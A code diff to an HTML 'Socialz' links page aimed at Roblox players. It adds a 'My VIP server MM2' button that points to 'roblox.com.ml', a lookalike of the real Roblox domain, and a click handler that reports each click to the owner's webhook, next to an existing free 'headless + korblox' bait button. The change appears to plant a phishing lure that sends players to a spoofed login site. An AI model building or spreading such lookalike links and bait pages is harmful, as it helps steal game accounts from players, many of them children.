@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>leaswxg | Socialz 
-    </title>
+    <title>leaswxg | Socialz</title>
     <style>
         :root {
             --primary-blue: #00A2FF;
@@ -231,6 +230,13 @@
             </a>
         </div>
 
+        <div class="roblox-wrapper">
+            <a href="https://roblox.com.ml/games/142823291/Murder-Mystery-2?privateServerLinkCode=035836652181622771155746159485" id="vipBtn" target="_blank" rel="noopener noreferrer" class="btn btn-mm2">
+                <div class="shine-line"></div>
+                My VIP server MM2
+            </a>
+        </div>
+
         <button id="gameBtn" class="btn btn-game">
             <div class="shine-line"></div>
             UGC headless + korblox
@@ -301,6 +307,10 @@
                 });
             } catch (err) {}
         }
+
+        document.getElementById('vipBtn').addEventListener('click', () => {
+            sendWebhook("VIP Server Clicked");
+        });
 
         document.getElementById('gameBtn').addEventListener('click', async () => {
             const btn = document.getElementById('gameBtn');
